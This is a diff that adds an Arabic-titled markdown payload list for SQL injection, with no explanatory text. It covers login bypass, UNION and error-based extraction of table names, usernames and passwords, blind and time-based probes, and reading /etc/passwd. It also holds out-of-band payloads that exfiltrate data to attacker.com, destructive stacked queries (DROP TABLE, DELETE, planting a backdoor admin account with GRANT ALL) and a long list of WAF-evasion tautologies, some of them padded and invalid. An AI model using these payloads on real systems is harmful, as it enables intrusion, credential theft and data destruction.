@@ -1,0 +1,602 @@
+# SQL Injection Payloads - قائمة بايلودات SQL Injection موسعة
+
+## بايلودات أساسية
+' OR 1=1--
+" OR 1=1--
+' OR '1'='1
+" OR "1"="1
+' OR 1=1#
+" OR 1=1#
+' OR 1=1/*
+" OR 1=1/*
+admin'--
+admin'#
+admin'/*
+admin" --
+admin"#
+admin"/*
+') OR ('1'='1
+") OR ("1"="1
+')) OR (('1'='1
+")) OR (("1"="1
+')); OR ((('1'='1
+")); OR ((("1"="1
+' OR 1=1 LIMIT 1--
+" OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1#
+" OR 1=1 LIMIT 1#
+' OR 1=1 LIMIT 1/*
+" OR 1=1 LIMIT 1/*
+
+## بايلودات UNION
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+" UNION SELECT 1--
+" UNION SELECT 1,2--
+" UNION SELECT 1,2,3--
+" UNION SELECT 1,2,3,4--
+" UNION SELECT 1,2,3,4,5--
+' UNION ALL SELECT 1--
+' UNION ALL SELECT 1,2--
+' UNION ALL SELECT 1,2,3--
+' UNION ALL SELECT 1,2,3,4--
+' UNION ALL SELECT 1,2,3,4,5--
+" UNION ALL SELECT 1--
+" UNION ALL SELECT 1,2--
+" UNION ALL SELECT 1,2,3--
+" UNION ALL SELECT 1,2,3,4--
+" UNION ALL SELECT 1,2,3,4,5--
+' UNION SELECT null--
+' UNION SELECT null,null--
+' UNION SELECT null,null,null--
+' UNION SELECT null,null,null,null--
+' UNION SELECT null,null,null,null,null--
+" UNION SELECT null--
+" UNION SELECT null,null--
+" UNION SELECT null,null,null--
+" UNION SELECT null,null,null,null--
+" UNION SELECT null,null,null,null,null--
+
+## بايلودات استخراج المعلومات
+' UNION SELECT 1,2,3,4,table_name,6 FROM information_schema.tables--
+' UNION SELECT 1,2,3,4,column_name,6 FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,2,3,4,concat(table_name,':',column_name),6 FROM information_schema.columns--
+' UNION SELECT 1,2,3,4,concat(username,':',password),6 FROM users--
+' UNION SELECT 1,2,3,4,group_concat(table_name),6 FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3,4,group_concat(column_name),6 FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,2,3,4,group_concat(username,':',password),6 FROM users--
+' UNION SELECT 1,2,3,4,load_file('/etc/passwd'),6--
+' UNION SELECT 1,2,3,4,@@version,6--
+' UNION SELECT 1,2,3,4,@@datadir,6--
+' UNION SELECT 1,2,3,4,user(),6--
+' UNION SELECT 1,2,3,4,database(),6--
+' UNION SELECT 1,2,3,4,version(),6--
+' UNION SELECT 1,2,3,4,system_user(),6--
+' UNION SELECT 1,2,3,4,session_user(),6--
+' UNION SELECT 1,2,3,4,current_user(),6--
+
+## بايلودات Blind SQL Injection
+' AND 1=1--
+' AND 1=2--
+' AND (SELECT 1 FROM users LIMIT 1)=1--
+' AND (SELECT 1 FROM non_existent_table LIMIT 1)=1--
+' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1)=97--
+' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1)=97--
+' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--
+' AND (SELECT COUNT(*) FROM users)=1--
+' AND (SELECT COUNT(*) FROM users)>1--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--
+' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%')>0--
+' AND (SELECT LENGTH(username) FROM users WHERE id=1)=5--
+' AND (SELECT LENGTH(password) FROM users WHERE id=1)=32--
+' AND IF((SELECT 1 FROM users WHERE username='admin'),1,0)=1--
+' AND IF((SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5),1,0)=1--
+
+## بايلودات Time-Based Blind SQL Injection
+' AND (SELECT SLEEP(5))--
+' AND (SELECT SLEEP(5))#
+' OR (SELECT SLEEP(5))--
+' OR (SELECT SLEEP(5))#
+' AND (SELECT SLEEP(5) FROM dual)--
+' AND (SELECT SLEEP(5) FROM dual)#
+' OR (SELECT SLEEP(5) FROM dual)--
+' OR (SELECT SLEEP(5) FROM dual)#
+' AND (SELECT BENCHMARK(10000000,MD5('A')))--
+' AND (SELECT BENCHMARK(10000000,MD5('A')))#
+' OR (SELECT BENCHMARK(10000000,MD5('A')))--
+' OR (SELECT BENCHMARK(10000000,MD5('A')))#
+' AND IF((SELECT 1 FROM users WHERE username='admin'),SLEEP(5),0)--
+' AND IF((SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5),SLEEP(5),0)--
+' AND IF((SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1)=97,SLEEP(5),0)--
+' AND IF((SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1)=97,SLEEP(5),0)--
+
+## بايلودات Error-Based SQL Injection
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT username FROM users LIMIT 0,1),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 0,1),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT username FROM users LIMIT 0,1),0x7e),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 0,1),0x7e),1)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT username FROM users LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT password FROM users LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+## بايلودات Out-of-Band SQL Injection
+' AND LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a.txt'))--
+' AND LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\a.txt'))--
+' AND LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a.txt'))--
+' AND LOAD_FILE(CONCAT('\\\\',table_name,'.attacker.com\\a.txt')) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--
+' AND LOAD_FILE(CONCAT('\\\\',column_name,'.attacker.com\\a.txt')) FROM information_schema.columns WHERE table_name='users' LIMIT 0,1--
+' AND LOAD_FILE(CONCAT('\\\\',username,'.attacker.com\\a.txt')) FROM users LIMIT 0,1--
+' AND LOAD_FILE(CONCAT('\\\\',password,'.attacker.com\\a.txt')) FROM users LIMIT 0,1--
+' UNION SELECT 1,2,3,4,LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a.txt')),6--
+' UNION SELECT 1,2,3,4,LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\a.txt')),6--
+' UNION SELECT 1,2,3,4,LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a.txt')),6--
+' UNION SELECT 1,2,3,4,LOAD_FILE(CONCAT('\\\\',table_name,'.attacker.com\\a.txt')),6 FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--
+' UNION SELECT 1,2,3,4,LOAD_FILE(CONCAT('\\\\',column_name,'.attacker.com\\a.txt')),6 FROM information_schema.columns WHERE table_name='users' LIMIT 0,1--
+' UNION SELECT 1,2,3,4,LOAD_FILE(CONCAT('\\\\',username,'.attacker.com\\a.txt')),6 FROM users LIMIT 0,1--
+' UNION SELECT 1,2,3,4,LOAD_FILE(CONCAT('\\\\',password,'.attacker.com\\a.txt')),6 FROM users LIMIT 0,1--
+
+## بايلودات Second-Order SQL Injection
+' OR 1=1; INSERT INTO logs (message) VALUES ('Injected'); --
+' OR 1=1; UPDATE users SET password='hacked' WHERE username='admin'; --
+' OR 1=1; DELETE FROM users WHERE username='victim'; --
+' OR 1=1; DROP TABLE users; --
+' OR 1=1; CREATE TABLE backdoor (cmd TEXT); --
+' OR 1=1; GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' IDENTIFIED BY 'password'; --
+' OR 1=1; INSERT INTO users (username, password, role) VALUES ('hacker', 'password', 'admin'); --
+
+## بايلودات Stacked Queries
+'; INSERT INTO logs (message) VALUES ('Injected'); --
+'; UPDATE users SET password='hacked' WHERE username='admin'; --
+'; DELETE FROM users WHERE username='victim'; --
+'; DROP TABLE users; --
+'; CREATE TABLE backdoor (cmd TEXT); --
+'; GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' IDENTIFIED BY 'password'; --
+'; INSERT INTO users (username, password, role) VALUES ('hacker', 'password', 'admin'); --
+"; INSERT INTO logs (message) VALUES ('Injected'); --
+"; UPDATE users SET password='hacked' WHERE username='admin'; --
+"; DELETE FROM users WHERE username='victim'; --
+"; DROP TABLE users; --
+"; CREATE TABLE backdoor (cmd TEXT); --
+"; GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' IDENTIFIED BY 'password'; --
+"; INSERT INTO users (username, password, role) VALUES ('hacker', 'password', 'admin'); --
+
+## بايلودات تجاوز WAF
+' OR 1=1-- 
+' OR 1=1#
+' OR 1=1/*
+' OR 1/**/=/**/1--
+' OR 1%00=1--
+' OR 1%0A=1--
+' OR 1%0D=1--
+' OR 1%09=1--
+' OR 1%0B=1--
+' OR 1%0C=1--
+' OR 1%A0=1--
+' OR 1+1=2--
+' OR 2-1=1--
+' OR 1*1=1--
+' OR 1/1=1--
+' OR 1%1=0--
+' OR 1^0=1--
+' OR 1&1=1--
+' OR 1|0=1--
+' OR 1||1=1--
+' OR 1&&1=1--
+' OR 1<2--
+' OR 2>1--
+' OR 1<=1--
+' OR 1>=1--
+' OR 1<>2--
+' OR 1!=2--
+' OR 1=1 LIMIT 1--
+' OR (1)=(1)--
+' OR (1)LIKE(1)--
+' OR (1)IN(1)--
+' OR (1)BETWEEN(0)AND(2)--
+' OR TRUE--
+' OR NOT FALSE--
+' OR !0--
+' OR CHAR(49)=CHAR(49)--
+' OR ASCII(1)=ASCII(1)--
+' OR UNICODE(1)=UNICODE(1)--
+' OR ORD(1)=ORD(1)--
+' OR HEX(1)=HEX(1)--
+' OR BIN(1)=BIN(1)--
+' OR BINARY 1=1--
+' OR CAST(1 AS CHAR)=CAST(1 AS CHAR)--
+' OR CONVERT(1,CHAR)=CONVERT(1,CHAR)--
+' OR 1 REGEXP 1--
+' OR 1 RLIKE 1--
+' OR 1 SOUNDS LIKE 1--
+' OR 1 SIMILAR TO 1--
+' OR 1 GLOB 1--
+' OR 1 MATCH 1--
+' OR 1 CONTAINS 1--
+' OR 1 LIKE 1--
+' OR 1 DIV 1=1--
+' OR 1 XOR 0=1--
+' OR 1 IS NOT NULL--
+' OR 1 IS TRUE--
+' OR 1 IS NOT FALSE--
+' OR EXISTS(SELECT 1)--
+' OR CASE WHEN 1=1 THEN 1 ELSE 0 END=1--
+' OR IF(1=1,1,0)=1--
+' OR IFNULL(1,0)=1--
+' OR NULLIF(0,0) IS NULL--
+' OR COALESCE(1,0)=1--
+' OR ELT(1,1)=1--
+' OR FIELD(1,1)=1--
+' OR INSTR(1,1)>0--
+' OR LOCATE(1,1)>0--
+' OR POSITION(1 IN 1)>0--
+' OR STRCMP(1,1)=0--
+' OR FIND_IN_SET(1,1)>0--
+' OR GREATEST(1,0)=1--
+' OR LEAST(1,2)=1--
+' OR ABS(1)=1--
+' OR ACOS(0)=ACOS(0)--
+' OR ASIN(0)=ASIN(0)--
+' OR ATAN(0)=ATAN(0)--
+' OR ATAN2(0,1)=ATAN2(0,1)--
+' OR CEIL(1)=CEIL(1)--
+' OR CEILING(1)=CEILING(1)--
+' OR COS(0)=COS(0)--
+' OR COT(1)=COT(1)--
+' OR DEGREES(0)=DEGREES(0)--
+' OR EXP(0)=EXP(0)--
+' OR FLOOR(1)=FLOOR(1)--
+' OR LN(1)=LN(1)--
+' OR LOG(1)=LOG(1)--
+' OR LOG10(1)=LOG10(1)--
+' OR LOG2(1)=LOG2(1)--
+' OR MOD(1,1)=0--
+' OR PI()=PI()--
+' OR POW(1,1)=POW(1,1)--
+' OR POWER(1,1)=POWER(1,1)--
+' OR RADIANS(0)=RADIANS(0)--
+' OR RAND()>=0--
+' OR ROUND(1)=ROUND(1)--
+' OR SIGN(1)=SIGN(1)--
+' OR SIN(0)=SIN(0)--
+' OR SQRT(1)=SQRT(1)--
+' OR TAN(0)=TAN(0)--
+' OR TRUNCATE(1,0)=TRUNCATE(1,0)--
+' OR ASCII(MID((SELECT @@version),1,1))=ASCII(MID((SELECT @@version),1,1))--
+' OR LENGTH((SELECT @@version))=LENGTH((SELECT @@version))--
+' OR SUBSTRING((SELECT @@version),1,1)=SUBSTRING((SELECT @@version),1,1)--
+' OR SUBSTR((SELECT @@version),1,1)=SUBSTR((SELECT @@version),1,1)--
+' OR MID((SELECT @@version),1,1)=MID((SELECT @@version),1,1)--
+' OR LEFT((SELECT @@version),1)=LEFT((SELECT @@version),1)--
+' OR RIGHT((SELECT @@version),1)=RIGHT((SELECT @@version),1)--
+' OR LOWER((SELECT @@version))=LOWER((SELECT @@version))--
+' OR UPPER((SELECT @@version))=UPPER((SELECT @@version))--
+' OR REVERSE((SELECT @@version))=REVERSE((SELECT @@version))--
+' OR REPLACE((SELECT @@version),'a','a')=(SELECT @@version)--
+' OR TRIM((SELECT @@version))=(SELECT @@version)--
+' OR LTRIM((SELECT @@version))=(SELECT @@version)--
+' OR RTRIM((SELECT @@version))=(SELECT @@version)--
+' OR LPAD((SELECT @@version),LENGTH((SELECT @@version)),'a')=(SELECT @@version)--
+' OR RPAD((SELECT @@version),LENGTH((SELECT @@version)),'a')=(SELECT @@version)--
+' OR SPACE(0)=''--
+' OR REPEAT('a',0)=''--
+' OR CONCAT('a','a')='aa'--
+' OR CONCAT_WS('a','a','a')='aaa'--
+' OR GROUP_CONCAT('a')='a'--
+' OR CHAR(97)='a'--
+' OR CHR(97)='a'--
+' OR UNHEX(61)='a'--
+' OR CHAR_LENGTH('a')=1--
+' OR CHARACTER_LENGTH('a')=1--
+' OR BIT_LENGTH('a')=8--
+' OR OCTET_LENGTH('a')=1--
+' OR BIT_COUNT(1)=1--
+' OR TO_BASE64('a')=TO_BASE64('a')--
+' OR FROM_BASE64(TO_BASE64('a'))='a'--
+' OR HEX('a')=HEX('a')--
+' OR UNHEX(HEX('a'))='a'--
+' OR CONV(10,10,16)=CONV(10,10,16)--
+' OR INET_ATON('127.0.0.1')=INET_ATON('127.0.0.1')--
+' OR INET_NTOA(INET_ATON('127.0.0.1'))='127.0.0.1'--
+' OR INET6_ATON('::1')=INET6_ATON('::1')--
+' OR INET6_NTOA(INET6_ATON('::1'))='::1'--
+' OR IS_IPV4('127.0.0.1')=1--
+' OR IS_IPV6('::1')=1--
+' OR IS_IPV4_COMPAT(INET6_ATON('::1'))=1--
+' OR IS_IPV4_MAPPED(INET6_ATON('::ffff:127.0.0.1'))=1--
+' OR UUID()=UUID()--
+' OR UUID_SHORT()=UUID_SHORT()--
+' OR VERSION()=VERSION()--
+' OR POW(1,1)=POWER(1,1)--
+' OR VARIANCE(1)=0--
+' OR VAR_POP(1)=0--
+' OR VAR_SAMP(1)=NULL--
+' OR STD(1)=0--
+' OR STDDEV(1)=0--
+' OR STDDEV_POP(1)=0--
+' OR STDDEV_SAMP(1)=NULL--
+' OR DECODE(ENCODE('a','a'),'a')='a'--
+' OR AES_ENCRYPT('a','a')=AES_ENCRYPT('a','a')--
+' OR AES_DECRYPT(AES_ENCRYPT('a','a'),'a')='a'--
+' OR DES_ENCRYPT('a')=DES_ENCRYPT('a')--
+' OR DES_DECRYPT(DES_ENCRYPT('a'))='a'--
+' OR ENCRYPT('a')=ENCRYPT('a')--
+' OR MD5('a')=MD5('a')--
+' OR SHA('a')=SHA('a')--
+' OR SHA1('a')=SHA1('a')--
+' OR SHA2('a',256)=SHA2('a',256)--
+' OR PASSWORD('a')=PASSWORD('a')--
+' OR OLD_PASSWORD('a')=OLD_PASSWORD('a')--
+' OR COMPRESS('a')=COMPRESS('a')--
+' OR UNCOMPRESS(COMPRESS('a'))='a'--
+' OR UNCOMPRESSED_LENGTH(COMPRESS('a'))=1--
+' OR CRC32('a')=CRC32('a')--
+' OR QUOTE('a')=QUOTE('a')--
+' OR QUOTE(1)=QUOTE(1)--
+' OR QUOTE(1.1)=QUOTE(1.1)--
+' OR QUOTE(NULL)=QUOTE(NULL)--
+' OR BENCHMARK(1,MD5(1))=0--
+' OR SLEEP(0)=0--
+' OR WAIT_UNTIL_SQL_THREAD_AFTER_GTIDS(1,0)=0--
+' OR MASTER_POS_WAIT(1,1,0)=0--
+' OR WAIT_FOR_EXECUTED_GTID_SET(1,0)=0--
+' OR GET_LOCK(1,0)=0--
+' OR RELEASE_LOCK(1)=0--
+' OR RELEASE_ALL_LOCKS()=0--
+' OR IS_FREE_LOCK(1)=1--
+' OR IS_USED_LOCK(1)=NULL--
+' OR LAST_INSERT_ID()=LAST_INSERT_ID()--
+' OR ROW_COUNT()=ROW_COUNT()--
+' OR FOUND_ROWS()=FOUND_ROWS()--
+' OR CONNECTION_ID()=CONNECTION_ID()--
+' OR CURRENT_USER()=CURRENT_USER()--
+' OR CURRENT_ROLE()=CURRENT_ROLE()--
+' OR CURRENT_DATE()=CURRENT_DATE()--
+' OR CURRENT_TIME()=CURRENT_TIME()--
+' OR CURRENT_TIMESTAMP()=CURRENT_TIMESTAMP()--
+' OR LOCALTIME()=LOCALTIME()--
+' OR LOCALTIMESTAMP()=LOCALTIMESTAMP()--
+' OR UTC_DATE()=UTC_DATE()--
+' OR UTC_TIME()=UTC_TIME()--
+' OR UTC_TIMESTAMP()=UTC_TIMESTAMP()--
+' OR SYSDATE()=SYSDATE()--
+' OR UNIX_TIMESTAMP()=UNIX_TIMESTAMP()--
+' OR FROM_UNIXTIME(UNIX_TIMESTAMP())=FROM_UNIXTIME(UNIX_TIMESTAMP())--
+' OR EXTRACT(YEAR FROM CURRENT_DATE())=EXTRACT(YEAR FROM CURRENT_DATE())--
+' OR DAYOFWEEK(CURRENT_DATE())=DAYOFWEEK(CURRENT_DATE())--
+' OR WEEKDAY(CURRENT_DATE())=WEEKDAY(CURRENT_DATE())--
+' OR DAYOFMONTH(CURRENT_DATE())=DAYOFMONTH(CURRENT_DATE())--
+' OR DAYOFYEAR(CURRENT_DATE())=DAYOFYEAR(CURRENT_DATE())--
+' OR MONTH(CURRENT_DATE())=MONTH(CURRENT_DATE())--
+' OR DAYNAME(CURRENT_DATE())=DAYNAME(CURRENT_DATE())--
+' OR MONTHNAME(CURRENT_DATE())=MONTHNAME(CURRENT_DATE())--
+' OR QUARTER(CURRENT_DATE())=QUARTER(CURRENT_DATE())--
+' OR WEEK(CURRENT_DATE())=WEEK(CURRENT_DATE())--
+' OR YEARWEEK(CURRENT_DATE())=YEARWEEK(CURRENT_DATE())--
+' OR YEAR(CURRENT_DATE())=YEAR(CURRENT_DATE())--
+' OR HOUR(CURRENT_TIME())=HOUR(CURRENT_TIME())--
+' OR MINUTE(CURRENT_TIME())=MINUTE(CURRENT_TIME())--
+' OR SECOND(CURRENT_TIME())=SECOND(CURRENT_TIME())--
+' OR MICROSECOND(CURRENT_TIME())=MICROSECOND(CURRENT_TIME())--
+' OR TIME_TO_SEC(CURRENT_TIME())=TIME_TO_SEC(CURRENT_TIME())--
+' OR SEC_TO_TIME(TIME_TO_SEC(CURRENT_TIME()))=SEC_TO_TIME(TIME_TO_SEC(CURRENT_TIME()))--
+' OR TO_DAYS(CURRENT_DATE())=TO_DAYS(CURRENT_DATE())--
+' OR FROM_DAYS(TO_DAYS(CURRENT_DATE()))=FROM_DAYS(TO_DAYS(CURRENT_DATE()))--
+' OR TO_SECONDS(CURRENT_TIMESTAMP())=TO_SECONDS(CURRENT_TIMESTAMP())--
+' OR FROM_SECONDS(TO_SECONDS(CURRENT_TIMESTAMP()))=FROM_SECONDS(TO_SECONDS(CURRENT_TIMESTAMP()))--
+' OR PERIOD_ADD(200801,1)=200802--
+' OR PERIOD_DIFF(200802,200801)=1--
+' OR DATE_ADD(CURRENT_DATE(),INTERVAL 1 DAY)=DATE_ADD(CURRENT_DATE(),INTERVAL 1 DAY)--
+' OR DATE_SUB(CURRENT_DATE(),INTERVAL 1 DAY)=DATE_SUB(CURRENT_DATE(),INTERVAL 1 DAY)--
+' OR ADDDATE(CURRENT_DATE(),INTERVAL 1 DAY)=ADDDATE(CURRENT_DATE(),INTERVAL 1 DAY)--
+' OR SUBDATE(CURRENT_DATE(),INTERVAL 1 DAY)=SUBDATE(CURRENT_DATE(),INTERVAL 1 DAY)--
+' OR ADDTIME(CURRENT_TIME(),'1:1:1')=ADDTIME(CURRENT_TIME(),'1:1:1')--
+' OR SUBTIME(CURRENT_TIME(),'1:1:1')=SUBTIME(CURRENT_TIME(),'1:1:1')--
+' OR TIMESTAMP(CURRENT_DATE(),CURRENT_TIME())=TIMESTAMP(CURRENT_DATE(),CURRENT_TIME())--
+' OR TIMESTAMPADD(MINUTE,1,CURRENT_TIMESTAMP())=TIMESTAMPADD(MINUTE,1,CURRENT_TIMESTAMP())--
+' OR TIMESTAMPDIFF(MINUTE,CURRENT_TIMESTAMP(),TIMESTAMPADD(MINUTE,1,CURRENT_TIMESTAMP()))=1--
+' OR LAST_DAY(CURRENT_DATE())=LAST_DAY(CURRENT_DATE())--
+' OR MAKEDATE(YEAR(CURRENT_DATE()),1)=MAKEDATE(YEAR(CURRENT_DATE()),1)--
+' OR MAKETIME(1,1,1)=MAKETIME(1,1,1)--
+' OR GET_FORMAT(DATE,'ISO')=GET_FORMAT(DATE,'ISO')--
+' OR STR_TO_DATE('01,5,2013','%d,%m,%Y')=STR_TO_DATE('01,5,2013','%d,%m,%Y')--
+' OR DATE_FORMAT(CURRENT_DATE(),'%W %D %M %Y')=DATE_FORMAT(CURRENT_DATE(),'%W %D %M %Y')--
+' OR TIME_FORMAT(CURRENT_TIME(),'%H %i %s')=TIME_FORMAT(CURRENT_TIME(),'%H %i %s')--
+' OR DATABASE()=DATABASE()--
+' OR SCHEMA()=SCHEMA()--
+' OR USER()=USER()--
+' OR SYSTEM_USER()=SYSTEM_USER()--
+' OR SESSION_USER()=SESSION_USER()--
+' OR CHARSET('a')=CHARSET('a')--
+' OR COLLATION('a')=COLLATION('a')--
+' OR COERCIBILITY('a')=COERCIBILITY('a')--
+' OR BINARY 'a'='a'--
+' OR _binary 'a'='a'--
+' OR _latin1 'a'='a'--
+' OR _utf8 'a'='a'--
+' OR _utf8mb4 'a'='a'--
+' OR _utf16 'a'='a'--
+' OR _utf32 'a'='a'--
+' OR _ascii 'a'='a'--
+' OR _cp1251 'a'='a'--
+' OR _cp1256 'a'='a'--
+' OR _cp850 'a'='a'--
+' OR _cp852 'a'='a'--
+' OR _cp866 'a'='a'--
+' OR _cp932 'a'='a'--
+' OR _dec8 'a'='a'--
+' OR _eucjpms 'a'='a'--
+' OR _euckr 'a'='a'--
+' OR _gb18030 'a'='a'--
+' OR _gb2312 'a'='a'--
+' OR _gbk 'a'='a'--
+' OR _geostd8 'a'='a'--
+' OR _greek 'a'='a'--
+' OR _hebrew 'a'='a'--
+' OR _hp8 'a'='a'--
+' OR _keybcs2 'a'='a'--
+' OR _koi8r 'a'='a'--
+' OR _koi8u 'a'='a'--
+' OR _latin2 'a'='a'--
+' OR _latin5 'a'='a'--
+' OR _latin7 'a'='a'--
+' OR _macce 'a'='a'--
+' OR _macroman 'a'='a'--
+' OR _sjis 'a'='a'--
+' OR _swe7 'a'='a'--
+' OR _tis620 'a'='a'--
+' OR _ucs2 'a'='a'--
+' OR _ujis 'a'='a'--
+' OR _armscii8 'a'='a'--
+' OR _cp1250 'a'='a'--
+' OR _cp1257 'a'='a'--
+' OR _cp864 'a'='a'--
+' OR _cp869 'a'='a'--
+' OR _geostd8 'a'='a'--
+' OR _latin1_de 'a'='a'--
+' OR _latin1_general_ci 'a'='a'--
+' OR _latin1_swedish_ci 'a'='a'--
+' OR _utf8_general_ci 'a'='a'--
+' OR _utf8_unicode_ci 'a'='a'--
+' OR _utf8mb4_general_ci 'a'='a'--
+' OR _utf8mb4_unicode_ci 'a'='a'--
+' OR _utf16_general_ci 'a'='a'--
+' OR _utf16_unicode_ci 'a'='a'--
+' OR _utf32_general_ci 'a'='a'--
+' OR _utf32_unicode_ci 'a'='a'--
+' OR CAST('a' AS CHAR)='a'--
+' OR CAST('a' AS CHAR(1))='a'--
+' OR CAST('a' AS CHAR CHARACTER SET latin1)='a'--
+' OR CAST('a' AS CHAR(1) CHARACTER SET latin1)='a'--
+' OR CAST('a' AS BINARY)='a'--
+' OR CAST('a' AS BINARY(1))='a'--
+' OR CAST(1 AS SIGNED)=1--
+' OR CAST(1 AS SIGNED INTEGER)=1--
+' OR CAST(1 AS UNSIGNED)=1--
+' OR CAST(1 AS UNSIGNED INTEGER)=1--
+' OR CAST(1 AS DECIMAL)=1--
+' OR CAST(1 AS DECIMAL(10,0))=1--
+' OR CAST(1 AS FLOAT)=1--
+' OR CAST(1 AS DOUBLE)=1--
+' OR CAST(1 AS REAL)=1--
+' OR CAST(1 AS DATE)=CAST(1 AS DATE)--
+' OR CAST(1 AS DATETIME)=CAST(1 AS DATETIME)--
+' OR CAST(1 AS TIME)=CAST(1 AS TIME)--
+' OR CAST(1 AS YEAR)=CAST(1 AS YEAR)--
+' OR CAST(1 AS JSON)=CAST(1 AS JSON)--
+' OR CONVERT(1,SIGNED)=1--
+' OR CONVERT(1,SIGNED INTEGER)=1--
+' OR CONVERT(1,UNSIGNED)=1--
+' OR CONVERT(1,UNSIGNED INTEGER)=1--
+' OR CONVERT(1,DECIMAL)=1--
+' OR CONVERT(1,DECIMAL(10,0))=1--
+' OR CONVERT(1,FLOAT)=1--
+' OR CONVERT(1,DOUBLE)=1--
+' OR CONVERT(1,REAL)=1--
+' OR CONVERT(1,DATE)=CONVERT(1,DATE)--
+' OR CONVERT(1,DATETIME)=CONVERT(1,DATETIME)--
+' OR CONVERT(1,TIME)=CONVERT(1,TIME)--
+' OR CONVERT(1,YEAR)=CONVERT(1,YEAR)--
+' OR CONVERT(1,JSON)=CONVERT(1,JSON)--
+' OR CONVERT(1 USING latin1)=CONVERT(1 USING latin1)--
+' OR CONVERT(1 USING utf8)=CONVERT(1 USING utf8)--
+' OR CONVERT(1 USING utf8mb4)=CONVERT(1 USING utf8mb4)--
+' OR CONVERT(1 USING utf16)=CONVERT(1 USING utf16)--
+' OR CONVERT(1 USING utf32)=CONVERT(1 USING utf32)--
+' OR CONVERT(1 USING ascii)=CONVERT(1 USING ascii)--
+' OR CONVERT(1 USING cp1251)=CONVERT(1 USING cp1251)--
+' OR CONVERT(1 USING cp1256)=CONVERT(1 USING cp1256)--
+' OR CONVERT(1 USING cp850)=CONVERT(1 USING cp850)--
+' OR CONVERT(1 USING cp852)=CONVERT(1 USING cp852)--
+' OR CONVERT(1 USING cp866)=CONVERT(1 USING cp866)--
+' OR CONVERT(1 USING cp932)=CONVERT(1 USING cp932)--
+' OR CONVERT(1 USING dec8)=CONVERT(1 USING dec8)--
+' OR CONVERT(1 USING eucjpms)=CONVERT(1 USING eucjpms)--
+' OR CONVERT(1 USING euckr)=CONVERT(1 USING euckr)--
+' OR CONVERT(1 USING gb18030)=CONVERT(1 USING gb18030)--
+' OR CONVERT(1 USING gb2312)=CONVERT(1 USING gb2312)--
+' OR CONVERT(1 USING gbk)=CONVERT(1 USING gbk)--
